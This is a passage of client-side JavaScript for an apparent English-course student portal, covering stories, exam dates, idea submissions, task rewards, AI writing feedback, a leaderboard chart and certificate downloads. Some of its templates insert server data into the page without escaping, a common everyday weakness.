  addStoryInteractions(mediaElement);
  content.append(mediaElement);

  document.getElementById('storyModal').style.display = 'flex';
}

function startProgressStories(duration) {
  storiesItemsStories.forEach((_, i) => {
    const b = document.getElementById(`barStories${i}`);
    if (b) {
      b.style.transition = 'none';
      b.style.transform = i < currentIndexStories ? 'scaleX(1)' : 'scaleX(0)';
    }
  });

  const bar = document.getElementById(`barStories${currentIndexStories}`);
  if (!bar) return;

  setTimeout(() => {
    bar.style.transition = `transform ${duration}ms linear`;
    bar.style.transform = 'scaleX(1)';
  }, 50);

  timeoutHandleStories = setTimeout(nextStoryStories, duration);
}

function pauseStory() {
  clearTimeout(timeoutHandleStories);
  isPausedStories = true;

  const video = document.querySelector('#storyContent video');
  if (video) video.pause();

  const bar = document.getElementById(`barStories${currentIndexStories}`);
  if (bar) {
    const computed = window.getComputedStyle(bar);
    const matrix = new WebKitCSSMatrix(computed.transform);
    const scale = matrix.a;
    bar.style.transition = 'none';
    bar.style.transform = `scaleX(${scale})`;
  }
}

function resumeStory() {
  if (!isPausedStories) return;
  isPausedStories = false;

  const video = document.querySelector('#storyContent video');
  if (video) {
    const remaining = (1 - video.currentTime / video.duration) * 1000 * video.duration;
    video.play();
    startProgressStories(remaining);
  } else {
    startProgressStories(3000); // assume 3s left on hold
  }
}

function addStoryInteractions(el) {
  if (!el) return;

  el.addEventListener('mousedown', () => {
    holdTimeoutStories = setTimeout(pauseStory, 200);
  });

  el.addEventListener('mouseup', () => {
    clearTimeout(holdTimeoutStories);
    resumeStory();
  });

  el.addEventListener('touchstart', () => {
    holdTimeoutStories = setTimeout(pauseStory, 200);
  });

  el.addEventListener('touchend', () => {
    clearTimeout(holdTimeoutStories);
    resumeStory();
  });

  el.addEventListener('dblclick', () => {
    nextStoryStories();
  });
}

function nextStoryStories() {
  clearTimeout(timeoutHandleStories);
  if (currentIndexStories + 1 < storiesItemsStories.length) {
    openStoryStories(currentIndexStories + 1);
  } else {
    closeStoriesStories();
  }
}

function closeStoriesStories() {
  clearTimeout(timeoutHandleStories);
  document.getElementById('storyModal').style.display = 'none';
  document.getElementById('storyContent').innerHTML = '';
}

document.addEventListener('DOMContentLoaded', fetchStoriesStories);


async function examsPageActive() {
  const container = document.getElementById("exams-container");
  container.innerHTML = `
    <div class="container-exam-loading">
      <div class="loader">
        <div class="crystal"></div>
        <div class="crystal"></div>
        <div class="crystal"></div>
        <div class="crystal"></div>
        <div class="crystal"></div>
        <div class="crystal"></div>
      </div>
    </div>
  `;

  const username = currentUser;
  try {
    const res = await fetch(`/api/get-student-progress?username=${username}`);
    const data = await res.json();

    if (data.error || !data[username]) {
      container.innerHTML = '<p class="error-msg">No data found.</p>';
      return;
    }

    const student = data[username];
    const level = window.currentLevel || "Beginner";
    const studyDays = student["study_days"] || "-";
    const midterm = student["midterm-exam"] || "Not Assigned";
    const final = student["final-exam"] || "Not Assigned";

    container.innerHTML = `
      <div class="exam-card" style="animation-delay: 0s;">
        <div class="exam-icon" style="background: linear-gradient(135deg, #007bff, #0056b3);">
          <i class="fas fa-file-alt"></i>
        </div>
        <div class="exam-info">
          <h3>Midterm Exam</h3>
          <p><strong>Group:</strong> ${level} (${studyDays})</p>
          <p><strong>Date:</strong> ${midterm}</p>
        </div>
      </div>
      <div class="exam-card" style="animation-delay: 0.15s;">
        <div class="exam-icon" style="background: linear-gradient(135deg, #dc3545, #a71d2a);">
          <i class="fas fa-graduation-cap"></i>
        </div>
        <div class="exam-info">
          <h3>Final Exam</h3>
          <p><strong>Group:</strong> ${level} (${studyDays})</p>
          <p><strong>Date:</strong> ${final}</p>
        </div>
      </div>
    `;
  } catch (err) {
    console.error(err);
    container.innerHTML = '<p class="error-msg">Server error. Try again later.</p>';
  }
}

const ideaList = document.getElementById('idea-list');
const ideaForm = document.getElementById('idea-form');
const toggleButton = document.getElementById('toggle-idea-form');
const overlay = document.getElementById('idea-overlay');
const fileInputIdeas = document.querySelector('input[name="media"]');
const submitButton = ideaForm.querySelector('button[type="submit"]');

// Показываем форму
toggleButton.onclick = () => {
  hideNavigation();
  ideaForm.classList.add('show');
  ideaForm.classList.remove('hidden');
  overlay.classList.remove('hidden');
};

// Скрываем форму
overlay.onclick = () => {
  showNavigation();
  ideaForm.classList.remove('show');
  ideaForm.classList.add('hidden');
  overlay.classList.add('hidden');
};

// Загрузка идей при входе
async function loadIdeas() {
  const res = await fetch(`/get_ideas/${currentUser}`);
  const ideas = await res.json();

  ideaList.innerHTML = '';
  ideas.reverse().forEach((idea, index) => {
    const card = document.createElement('div');
    card.className = 'idea-card';

    const date = new Date(idea.timestamp);
    const formatted = date.toLocaleString('en-US', {
      weekday: 'long',
      month: 'short',
      day: 'numeric',
      hour: 'numeric',
      minute: 'numeric'
    });

    card.innerHTML = `
      <div class="idea-header">
        <div class="idea-title">Submission #${index + 1}</div>
        <span class="idea-status ${idea.status.toLowerCase().replace(' ', '-')}"">${idea.status}</span>
      </div>
      <div class="idea-text">${idea.text}</div>
      ${idea.media ? '<div class="idea-media">Attached file</div>' : ''}
      <div class="idea-footer">
        <i class="far fa-calendar-alt"></i>
        <span>${formatted}</span>
      </div>
    `;
    ideaList.appendChild(card);
  });
}

// Отправка формы
ideaForm.onsubmit = async (e) => {
  e.preventDefault();
  const formData = new FormData(ideaForm);
  formData.append('username', currentUser);

  const loader = document.createElement('div');
  loader.className = 'container-exam-loading';
  const innerLoader = document.createElement('div');
  innerLoader.className = 'loader';
  for (let i = 0; i < 6; i++) {
    const crystal = document.createElement('div');
    crystal.className = 'crystal';
    innerLoader.appendChild(crystal);
  }
  const progress = document.createElement('span');
  progress.className = 'upload-progress';
  progress.textContent = '0%';
  loader.appendChild(innerLoader);
  loader.appendChild(progress);
  loader.style.display = 'flex';
  loader.style.flexDirection = 'column';
  loader.style.alignItems = 'center';
  loader.style.marginLeft = '10px';
  fileInputIdeas.parentNode.appendChild(loader);

  submitButton.disabled = true;
  submitButton.style.pointerEvents = 'none';

  const xhr = new XMLHttpRequest();
  xhr.open('POST', '/submit_idea', true);
  xhr.upload.onprogress = (e) => {
    if (e.lengthComputable) {
      const percent = Math.round((e.loaded / e.total) * 100);
      progress.textContent = `${percent}%`;
    }
  };
  xhr.onload = () => {
    loader.remove();
    submitButton.disabled = false;
    submitButton.style.pointerEvents = 'auto';
    if (xhr.status === 200) {
      const data = JSON.parse(xhr.responseText);
      if (data.success) {
        ideaForm.reset();
        ideaForm.classList.remove('show');
        ideaForm.classList.add('hidden');
        overlay.classList.add('hidden');
        loadIdeas();
      }
    } else {
      const errorText = xhr.responseText;
      alert('Submission failed: ' + errorText);
      console.error('Submit error:', errorText);
    }
  };
  xhr.send(formData);
};

function loadTasks() {
  const container = document.getElementById('tasks-container');
  container.innerHTML = '<p><i class="fas fa-spinner fa-spin icon"></i> Loading tasks...</p>';

  fetch(`/api/tasks-list/${currentUser}`)
    .then(response => response.json())
    .then(tasks => {
      container.innerHTML = '';

      if (tasks.length === 0) {
        container.innerHTML = '<p><i class="fas fa-exclamation-circle icon"></i> No tasks found.</p>';
        return;
      }

      tasks.forEach(task => {
        const card = document.createElement('div');
        card.className = 'task-card';

        const deadlineDate = new Date(task.deadline);
        const id = `timer-${task.id}`;

        const statusIcon = task.completed ? '<i class="fas fa-check icon"></i>' : '<i class="fas fa-clock icon"></i>';
        const statusText = task.completed ? 'Done' : 'In Progress';
        const showTimer = !task.completed;

        let claimBtn = '';
        if (task.completed && !task.claimed) {
          claimBtn = `<button class="claim-btn" onclick="claimTask(${task.id}, '${task.title}', ${task.reward})"><i class="fas fa-coins icon"></i> Claim ${task.reward} pts</button>`;
        } else if (task.claimed) {
          claimBtn = `<p class="claimed-text"><i class="fas fa-check icon"></i> Claimed</p>`;
        }

        card.innerHTML = `
          <h3><i class="fas fa-tasks icon"></i> ${task.title}</h3>
          <p><i class="fas fa-trophy icon"></i> <strong>Reward:</strong> ${task.reward} pts</p>
          <p><i class="fas fa-calendar-alt icon"></i> <strong>Deadline:</strong> ${task.deadline}</p>
          <p>${statusIcon} <strong>Status:</strong> ${statusText}</p>
          ${showTimer ? `<p><i class="fas fa-hourglass-half icon"></i> <strong>Time Left:</strong> <span class="timer" id="${id}"></span></p>` : ''}
          ${claimBtn}
        `;

        container.appendChild(card);

        if (showTimer) {
          startCountdownTasks(deadlineDate, id);
        }
      });
    });
}

function claimTask(taskId, title, reward) {
  const btn = event.target;
  btn.disabled = true;
  btn.innerHTML = '<i class="fas fa-spinner fa-spin icon"></i> Claiming...';

  fetch(`/api/claim-task/${currentUser}/${taskId}`, {
    method: 'POST'
  })
    .then(res => res.json())
    .then(data => {
      showToastNotification(`Claimed ${reward} pts for "${title}"`);
      loadTasks();
    })
    .catch(err => {
      showToastNotification("Error claiming reward",'error');
      console.error(err);
    })
    .finally(() => {
      btn.disabled = false;
      btn.innerHTML = `<i class="fas fa-coins icon"></i> Claim ${reward} pts`;
    });
}

function startCountdownTasks(deadline, elementId) {
  function updateTimer() {
    const now = new Date();
    const diff = deadline - now;

    const el = document.getElementById(elementId);
    if (!el) return;

    if (diff <= 0) {
      el.textContent = "Expired";
      el.style.color = 'red';
      return;
    }

    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
    const minutes = Math.floor((diff / (1000 * 60)) % 60);
    const seconds = Math.floor((diff / 1000) % 60);

    el.textContent = `${days}d ${hours}h ${minutes}m ${seconds}s`;

    if (diff < 3600000) { // Less than 1 hour
      el.style.color = 'red';
    } else if (diff < 86400000) { // Less than 1 day
      el.style.color = 'orange';
    } else {
      el.style.color = 'green';
    }
  }

  updateTimer();
  setInterval(updateTimer, 1000);
}

let currentLevelForAnalysis = null;
let currentUnitForAnalysis = null;

async function loadPersonalSummary(username, level, unit) {
  const summaryEl = document.getElementById('personal-summary');
  const suggestionsBtn = document.getElementById('detailed-suggestions-btn');
  const resultBox = document.getElementById('detailed-analysis');

  summaryEl.innerHTML = 'Loading...';
  suggestionsBtn.style.display = 'none';

  try {
    const res = await fetch(`/api/get-personal-suggestions?username=${username}&level=${level}&unit=${unit}`);
    const data = await res.json();

    if (data.error) {
      summaryEl.innerHTML = `<p style="color:red;">${data.error}</p>`;
      resultBox.innerHTML = '';
    } else {
      currentLevelForAnalysis = level;
      currentUnitForAnalysis = data.current_unit;

      summaryEl.innerHTML = `
        <p><span class="unit-badge">Previous Unit:</span> ${data.previous_unit}</p>
        <p><span class="unit-badge">Current Unit:</span> ${data.current_unit}</p>
        <ul>
          <li data-label="Grammar">Grammar change: ${data.grammar_change}</li>
          <li data-label="Vocabulary">Vocabulary change: ${data.vocabulary_change}</li>
          <li data-label="Organization">Organization change: ${data.organization_change}</li>
          <li data-label="Task Structure">Task structure change: ${data.task_structure_change}</li>
        </ul>
        <p class="comment"><span class="unit-badge">Summary:</span> ${data.comment}</p>
      `;

      const storageKey = `analysis_${username}_${level}_${data.current_unit}`;
      const savedAnalysis = localStorage.getItem(storageKey);

      if (savedAnalysis) {
        const a = JSON.parse(savedAnalysis);
        resultBox.innerHTML = `
          <h4>AI Detailed Feedback:</h4>
          <ul>
            <li data-label="Grammar">Grammar: ${a.grammar.change} — ${a.grammar.comment}</li>
            <li data-label="Vocabulary">Vocabulary: ${a.vocabulary.change} — ${a.vocabulary.comment}</li>
            <li data-label="Organization">Organization: ${a.organization.change} — ${a.organization.comment}</li>
            <li data-label="Task Structure">Task Structure: ${a.task_structure.change} — ${a.task_structure.comment}</li>
          </ul>
          <p class="summary"><span class="unit-badge">Summary:</span> ${a.overall_comment}</p>
        `;
      } else {
        resultBox.innerHTML = '';
        suggestionsBtn.style.display = 'inline-block';
      }
    }
  } catch (err) {
    summaryEl.innerHTML = `<p style="color:red;">Failed to load summary</p>`;
    console.error(err);
  }
}

document.getElementById('detailed-suggestions-btn').addEventListener('click', async () => {
  const resultBox = document.getElementById('detailed-analysis');
  resultBox.innerHTML = 'Analyzing...';
  document.getElementById('updateModal').style.display = 'flex';
  startUpdateStatusText();

  if (!currentLevelForAnalysis || !currentUnitForAnalysis) {
    resultBox.innerHTML = `<p style="color:red;">Missing level or unit data</p>`;
	document.getElementById('updateModal').style.display = 'none';
      stopUpdateStatusText();
    return;
  }

  const storageKey = `analysis_${currentUser}_${currentLevelForAnalysis}_${currentUnitForAnalysis}`;

  try {
    const res = await fetch(`/api/compare-essays-ai-get?username=${currentUser}&level=${currentLevelForAnalysis}&unit=${currentUnitForAnalysis}`);
    const data = await res.json();

    if (!data.success) {
      resultBox.innerHTML = `<p style="color:red;">${data.error}</p>`;
	  document.getElementById('updateModal').style.display = 'none';
      stopUpdateStatusText();
    } else {
		document.getElementById('updateModal').style.display = 'none';
      stopUpdateStatusText();
      const a = data.analysis;

      localStorage.setItem(storageKey, JSON.stringify(a));

      resultBox.innerHTML = `
        <h4>AI Detailed Feedback:</h4>
        <ul>
          <li data-label="Grammar">Grammar: ${a.grammar.change} — ${a.grammar.comment}</li>
          <li data-label="Vocabulary">Vocabulary: ${a.vocabulary.change} — ${a.vocabulary.comment}</li>
          <li data-label="Organization">Organization: ${a.organization.change} — ${a.organization.comment}</li>
          <li data-label="Task Structure">Task Structure: ${a.task_structure.change} — ${a.task_structure.comment}</li>
        </ul>
        <p class="summary"><span class="unit-badge">Summary:</span> ${a.overall_comment}</p>
      `;

      document.getElementById('detailed-suggestions-btn').style.display = 'none';
    }
  } catch (err) {
    resultBox.innerHTML = `<p style="color:red;">Failed to load detailed analysis</p>`;
	document.getElementById('updateModal').style.display = 'none';
      stopUpdateStatusText();
    console.error(err);
  }
});

function createVideoPlayer(videoPath, containerId) {
  const container = document.getElementById(containerId);
  if (!container) return;

  // Если уже есть плеер в этом контейнере — удаляем его
  const existingPlayer = container.querySelector('.video-player');
  if (existingPlayer) {
    existingPlayer.remove();
  }

  const player = document.createElement('div');
  player.className = 'video-player';
  player.innerHTML = `
    <div class="player-container">
      <div class="video-wrapper">
        <video class="video-element">
          <source src="${videoPath}" type="video/mp4">
          Your browser does not support the video tag.
        </video>
      </div>
      <div class="controls-overlay">
        <div class="top-controls">
          <img src="static/icons/squid-game.webp" alt="Squid Game" class="series-icon">
        </div>
        <div class="bottom-controls">
          <div class="right-controls">
            <button class="play-pause-btn"><i class="fas fa-play"></i></button>
            <button class="volume-btn"><i class="fas fa-volume-up"></i></button>
            <button class="fullscreen-btn"><i class="fas fa-expand"></i></button>
          </div>
        </div>
      </div>
    </div>
  `;

  container.appendChild(player);

  const video = player.querySelector('.video-element');
  const playPauseBtn = player.querySelector('.play-pause-btn');

  playPauseBtn.addEventListener('click', () => {
    if (video.paused) {
      video.play();
      playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
    } else {
      video.pause();
      playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
    }
  });

  player.querySelector('.volume-btn').addEventListener('click', () => {
    video.muted = !video.muted;
  });

  player.querySelector('.fullscreen-btn').addEventListener('click', () => {
    if (video.requestFullscreen) {
      video.requestFullscreen();
    } else if (video.webkitRequestFullscreen) { /* Safari */
      video.webkitRequestFullscreen();
    } else if (video.msRequestFullscreen) { /* IE11 */
      video.msRequestFullscreen();
    }
  });
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

const activeCountdownIntervals = {};

function startCountdownSquidTimer(targetDateStr, elementId) {
  const targetDate = new Date(targetDateStr).getTime();
  const container = document.getElementById(elementId);

  // Очистить предыдущий интервал, если он уже есть для этого элемента
  if (activeCountdownIntervals[elementId]) {
    clearInterval(activeCountdownIntervals[elementId]);
  }

  let previousDigits = "";

  function animateDigitChange(oldChar, newChar, index) {
    const span = document.createElement('span');
    span.className = 'countdown-digit';
    span.textContent = newChar;
    span.style.animation = 'countdownDigitIn 0.4s ease-out';
    return span;
  }

  function renderStatusMessage(text) {
    container.innerHTML = '';
    const span = document.createElement('span');
    span.className = 'countdown-digit';
    span.textContent = text;
    container.appendChild(span);
  }

  function updateCountdown() {
    const now = new Date().getTime();
    const distance = targetDate - now;

    if (distance <= 0) {
      const passedSince = now - targetDate;

      if (passedSince < 60 * 1000) {
        renderStatusMessage('In progress');
      } else {
        renderStatusMessage('Passed');
      }

      clearInterval(activeCountdownIntervals[elementId]);
      delete activeCountdownIntervals[elementId];
      return;
    }

    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((distance % (1000 * 60)) / 1000);

    const formatted = `${days}d ${hours}h ${minutes}m ${seconds}s`;

    container.innerHTML = '';

    for (let i = 0; i < formatted.length; i++) {
      const newChar = formatted[i];
      const oldChar = previousDigits[i] || '';

      if (newChar !== oldChar) {
        const digitEl = animateDigitChange(oldChar, newChar, i);
        container.appendChild(digitEl);
      } else {
        const span = document.createElement('span');
        span.className = 'countdown-digit';
        span.textContent = newChar;
        container.appendChild(span);
      }
    }

    previousDigits = formatted;
  }

  // Сохраняем интервал для этого элемента
  activeCountdownIntervals[elementId] = setInterval(updateCountdown, 1000);
  updateCountdown();
}

async function openLiveLesson() {
  const unit = currentUnit;
  const container = document.getElementById("liveLessonBlock");
  const wrapper = document.getElementById("liveLesson");

  if (!container || !wrapper) return;

  wrapper.style.display = 'block';
  container.innerHTML = `
    <div class="tab-title">Loading Live Lesson Unit ${unit}...</div>
    <div class="unit-content"><p>Loading...</p></div>
  `;

  try {
    const response = await fetch(`/static/liveLessons/Unit${unit}.html`);
    const rawHTML = await response.text();

    const titleMatch   = rawHTML.match(/<!--\s*tab-title\s*-->([\s\S]*?)<!--\s*\/tab-title\s*-->/);
    const contentMatch = rawHTML.match(/<!--\s*content\s*-->([\s\S]*?)<!--\s*\/content\s*-->/);

    const tabTitle = titleMatch ? titleMatch[1].trim() : `Unit ${unit}`;
    const content  = contentMatch ? contentMatch[1].trim() : rawHTML;

    container.innerHTML = `
      <div class="tab-title">${tabTitle}</div>
      <div class="unit-content grammar-section">
        ${content}
      </div>
    `;
  } catch (error) {
    console.error(error);
    container.innerHTML = `
      <div class="tab-title">Live Lesson: Unit ${unit}</div>
      <div class="unit-content">
        <p class="error">Could not load content.</p>
      </div>
    `;
  }
}

  document.getElementById("current-unit-value").addEventListener("click", function() {
    showPage("liveLesson");
  });
  
  // showWritingTopList() — единственная внешняя функция.
// Требует: HTML-блок с id="writing-top-list" (как у тебя) и Chart.js подключён.
function showWritingTopList() {
  // конфиг / глобалы
  const unit = (typeof currentUnit !== 'undefined' && currentUnit) ? currentUnit : (document.getElementById('todaytasks-unit')?.textContent || '1.0');
  const level = (typeof currentLevel !== 'undefined' && currentLevel) ? currentLevel : 'Beginner';
  const userName = (typeof currentUser !== 'undefined' && currentUser) ? currentUser : (window.APP_USER || 'You');

  const page = document.getElementById('writing-top-list');
  if (!page) { console.warn('writing-top-list element not found'); return; }

  // Обёртка .wtl-card (если нет) — для CSS эффекта
  if (!page.querySelector('.wtl-card')) {
    const inner = document.createElement('div');
    inner.className = 'wtl-card';
    while (page.firstChild) inner.appendChild(page.firstChild);
    page.appendChild(inner);
  }

  // показать только эту страницу
  document.querySelectorAll('.page').forEach(p => { if (p !== page) p.style.display = 'none'; });
  page.style.display = 'block';
  page.querySelector('.wtl-card').classList.add('show');

  // элементы
  const posEl = page.querySelector('#wtl-position');
  const unitEl = page.querySelector('#wtl-unit');
  const levelEl = page.querySelector('#wtl-level');
  const listEl = page.querySelector('#wtl-list');
  const refreshBtn = page.querySelector('#wtl-refresh');
  let canvas = page.querySelector('#writing-chart');

  // ensure elements exist
  if (!listEl) {
    const ln = document.createElement('div'); ln.id = 'wtl-list'; ln.className = 'wtl-list';
    page.querySelector('.wtl-card').appendChild(ln);
  }
  if (!canvas) {
    const wrap = document.createElement('div'); wrap.className = 'wtl-chart-wrap';
    canvas = document.createElement('canvas'); canvas.id = 'writing-chart';
    wrap.appendChild(canvas);
    page.querySelector('.wtl-card').insertBefore(wrap, page.querySelector('#wtl-list'));
  }

  unitEl && (unitEl.textContent = unit);
  levelEl && (levelEl.textContent = level);
  posEl && (posEl.textContent = 'Loading...');

  // Chart instance holder (global-ish to avoid duplicates)
  if (!window._writingTopChart) window._writingTopChart = null;

  // helpers
  function findWritingKey(obj) {
    if (!obj) return null;
    return Object.keys(obj).find(k => k.toLowerCase().includes('writing')) || null;
  }
  function extractWritingScore(wobj) {
    if (!wobj) return { raw: 0, percent: 0, meta: wobj };
    if (typeof wobj.percent === 'number') return { raw: wobj.percent, percent: Math.max(0, Math.min(100, wobj.percent)), meta: wobj };
    if (typeof wobj.score === 'number') return { raw: wobj.score, percent: null, meta: wobj };
    if (Array.isArray(wobj.details) && wobj.details.length) {
      let sum = 0, found = false;
      for (const d of wobj.details) {
        if (typeof d.score === 'number') { sum += d.score; found = true; }
      }
      if (found) return { raw: sum, percent: null, meta: wobj };
      if (typeof wobj.total === 'number' && typeof wobj.correct === 'number') {
        const p = wobj.total ? Math.round((wobj.correct / wobj.total) * 100) : 0;
        return { raw: wobj.correct, percent: p, meta: wobj };
      }
    }
    if (typeof wobj.correct === 'number' && typeof wobj.total === 'number') {
      const p = wobj.total ? Math.round((wobj.correct / wobj.total) * 100) : 0;
      return { raw: wobj.correct, percent: p, meta: wobj };
    }
    return { raw: 0, percent: 0, meta: wobj };
  }
  function escapeHtml(s){ return String(s).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m])); }

  // draw list
  function renderList(entries, currentPlace) {
    const list = page.querySelector('#wtl-list');
    list.innerHTML = '';
    entries.forEach((e,idx) => {
      const row = document.createElement('div');
      row.className = 'wtl-item' + ((currentPlace && idx === currentPlace-1) ? ' current' : '');
      row.innerHTML = `
        <div class="left">
          <div class="wtl-rank">${idx+1}</div>
          <div class="wtl-user">
            <div class="name">${escapeHtml(e.username)}</div>
            <div class="meta">Raw: ${escapeHtml(String(e.raw))} — ${escapeHtml(String(e.percent))}%</div>
          </div>
        </div>
        <div class="wtl-score">${escapeHtml(String(e.percent))}%</div>
      `;
      if (currentPlace && idx === currentPlace-1) row.classList.add('current');
      list.appendChild(row);
    });
  }

  // build chart with Chart.js
  async function buildChart(entries) {
    // destroy previous chart
    if (window._writingTopChart) {
      window._writingTopChart.destroy();
      window._writingTopChart = null;
    }

    // prepare labels and data
    const labels = entries.map(e => e.username.length > 14 ? e.username.slice(0,13) + '…' : e.username);
    const data = entries.map(e => e.percent);

    // Chart.js dataset with gradient background
    const ctx = canvas.getContext('2d');

    // create chart (responsive)
    window._writingTopChart = new Chart(ctx, {
      type: 'bar',
      data: {
        labels,
        datasets: [{
          label: 'Writing AI %',
          data,
          // backgroundColor will be a function to create gradient per render
          backgroundColor: function(context) {
            const chart = context.chart;
            const {ctx, chartArea} = chart;
            if (!chartArea) return '#64b5f6';
            const grad = ctx.createLinearGradient(0, chartArea.top, 0, chartArea.bottom);
            grad.addColorStop(0, '#64b5f6');
            grad.addColorStop(1, '#0288d1');
            return grad;
          },
          borderRadius: 8,
          borderSkipped: false
        }]
      },
      options: {
        responsive: true,
        maintainAspectRatio: false,
        animation: { duration: 900, easing: 'easeOutCubic' },
        scales: {
          x: {
            ticks: { color: '#d6d9e6' },
            grid: { display: false }
          },
          y: {
            beginAtZero: true,
            max: 100,
            ticks: { color: '#d6d9e6', stepSize: 20 },
            grid: { color: 'rgba(255,255,255,0.06)' }
          }
        },
        plugins: {
          legend: { display: false },
          tooltip: {
            callbacks: {
              label: function(ctx) {
                const idx = ctx.dataIndex;
                const original = entries[idx];
                // show percent and raw
                return ` ${original.percent}% — raw: ${original.raw}`;
              }
            }
          }
        }
      }
    });

    // make canvas container height adaptive
    const wrap = page.querySelector('.wtl-chart-wrap') || canvas.parentElement;
    if (wrap) {
      wrap.style.height = Math.max(240, Math.min(420, labels.length * 36)) + 'px';
    }
  }

  // main fetch->process->render
  async function fetchAndRender() {
    posEl && (posEl.textContent = 'Loading...');
    page.querySelector('#wtl-list').innerHTML = '';

    let json;
    try {
      const res = await fetch(`/api/get-results?level=${encodeURIComponent(level)}&unit=${encodeURIComponent(unit)}`, { cache: 'no-store' });
      if (!res.ok) throw new Error('HTTP ' + res.status);
      json = await res.json();
    } catch (err) {
      posEl && (posEl.textContent = '#—');
      page.querySelector('#wtl-list').innerHTML = `<div style="padding:12px;color:#ffdede">Error: ${escapeHtml(err.message)}</div>`;
      if (window._writingTopChart) window._writingTopChart.destroy();
      return;
    }

    // extract writing AI per user
    const arr = [];
    for (const [username, userObj] of Object.entries(json || {})) {
      const wkey = findWritingKey(userObj);
      if (!wkey) continue;
      const wobj = userObj[wkey];
      const ex = extractWritingScore(wobj);
      arr.push({ username, raw: ex.raw, percent: ex.percent, meta: ex.meta, time: ex.meta?.time || null });
    }

    if (!arr.length) {
      posEl && (posEl.textContent = '#—');
      page.querySelector('#wtl-list').innerHTML = `<div style="padding:12px;color:#ffdede">No Writing AI results for this unit.</div>`;
      if (window._writingTopChart) window._writingTopChart.destroy();
      return;
    }

    // normalize percent if missing
    const needNorm = arr.some(e => e.percent === null || typeof e.percent !== 'number');
    if (needNorm) {
      const maxRaw = Math.max(...arr.map(e => Math.max(1, e.raw)));
      arr.forEach(e => e.percent = Math.round((e.raw / maxRaw) * 100));
    } else {
      arr.forEach(e => { if (typeof e.percent !== 'number') e.percent = 0; });
    }

    // sort desc by percent, then by time
    arr.sort((a,b) => {
      if (b.percent !== a.percent) return b.percent - a.percent;
      if (a.time && b.time) return new Date(b.time) - new Date(a.time);
      return a.username.localeCompare(b.username);
    });

    // find current user's position
    let idx = arr.findIndex(e => e.username === userName);
    if (idx === -1) {
      const low = userName.toLowerCase();
      idx = arr.findIndex(e => e.username.toLowerCase() === low);
    }
    const place = idx === -1 ? null : idx + 1;
    posEl && (posEl.textContent = place ? `#${place}` : '#—');

    // render list + chart
    renderList(arr, place);
    await buildChart(arr);
  }

  // attach refresh
  if (refreshBtn) refreshBtn.onclick = fetchAndRender;

  // responsive redraw on resize (Chart.js handles resize but we might want to re-create gradient)
  let resizeTimer = null;
  window.addEventListener('resize', () => {
    clearTimeout(resizeTimer);
    resizeTimer = setTimeout(() => {
      if (window._writingTopChart) window._writingTopChart.resize();
    }, 200);
  });

  // initial load
  fetchAndRender();

  // expose reload function
  window.reloadWritingTopList = fetchAndRender;
}

function loadCertificates(currentLevel) {
  const levels = ['Beginner', 'Elementary', 'Pre-Intermediate', 'Intermediate', 'IELTS L1', 'IELTS L2'];
  const container = document.getElementById('certificates-container');
  container.innerHTML = '';

  const zoomLevel = 60;
  const unitValue = parseFloat(currentUnit);

  levels.forEach((level, index) => {
    let status, statusText;

    if (level === currentLevel && unitValue < 12.3 && unitValue !== 0) {
      status = 'in-progress';
      statusText = 'In Progress';
    } else if (level === currentLevel && unitValue > 12.3) {
      status = 'in-progress';
      statusText = 'Generating';
    } else if (level === currentLevel && unitValue === 0) {
      status = 'completed';
      statusText = 'Completed';
    } else if (levels.indexOf(currentLevel) > index) {
      status = 'completed';
      statusText = 'Completed';
    } else {
      status = 'locked';
      statusText = 'Locked';
    }

    // Создаём обёртку карточки
    const wrapper = document.createElement('div');
    wrapper.className = 'certificate-wrapper';

    // Создаём карточку
    const card = document.createElement('div');
    card.className = `certificate-card ${status}`;
    card.innerHTML = `
      <div class="certificate-image-wrapper">
        <img class="certificate-image" src="/static/certificates/preview/${encodeURIComponent(level)}.png" alt="${level} Certificate" onerror="this.src='/static/certificates/preview/NoPhoto.png';">
      </div>
      <div class="certificate-info">
        <div class="certificate-title">${level}</div>
        <div class="certificate-status">${statusText}</div>
      </div>
    `;

    if (status === 'in-progress' || status === 'locked') {
      const overlay = document.createElement('div');
      overlay.className = 'certificate-overlay';
      let iconHtml = '';

      if (status === 'in-progress') {
        iconHtml = `
          <div class="spinner">
            ${Array.from({ length: 12 }).map(() => '<div class="spinner-blade"></div>').join('')}
          </div>
        `;
      } else {
        iconHtml = '<i class="fas fa-lock overlay-icon"></i>';
      }

      overlay.innerHTML = `
        <div class="overlay-button">
          ${iconHtml}
          <span class="overlay-text">${statusText}</span>
        </div>
      `;
      card.querySelector('.certificate-image-wrapper').appendChild(overlay);
    } else if (status === 'completed') {
      card.addEventListener('click', () => {
        const pdfUrl = `/static/certificates/completed/${encodeURIComponent(level)}/${currentUser}.pdf`;
        const pdfUrlWithZoom = `${pdfUrl}#toolbar=0&navpanes=0&scrollbar=0&zoom=${zoomLevel}`;

        const certificateView = document.createElement('div');
        certificateView.id = 'certificate-view';
        certificateView.innerHTML = `
          <div id="certificate-panel">
            <button id="back-btn">&lt;</button>
            <div id="pdf-container">
              <iframe id="pdf-frame" src="${pdfUrlWithZoom}"></iframe>
            </div>
            <div id="button-container">
              <button id="download-btn"><i class="fas fa-download"></i> Download</button>
            </div>
          </div>
        `;
        document.body.appendChild(certificateView);

        certificateView.querySelector('#back-btn').addEventListener('click', () => certificateView.remove());
        certificateView.querySelector('#download-btn').addEventListener('click', () => {
          const link = document.createElement('a');
          link.href = pdfUrl;
          link.download = `${level}_${currentUser}.pdf`;
          document.body.appendChild(link);
          link.click();
          link.remove();
        });
      });
    }

    // Вставляем карточку в обёртку
    wrapper.appendChild(card);
    container.appendChild(wrapper);
  });
}

const header = document.getElementById('todaytasks-header');
let lastScroll = 0;

window.addEventListener('scroll', () => {
  const scrollTop = window.scrollY;

  if (scrollTop > lastScroll && scrollTop > 10) {
    header.classList.add('sticky-active');
  } else if (scrollTop <= 10) {
    header.classList.remove('sticky-active');
  }

  lastScroll = scrollTop;
});

// Глобальный обработчик наведения
document.addEventListener('mouseover', function (e) {
  const target = e.target.closest('.exam-subquestion');
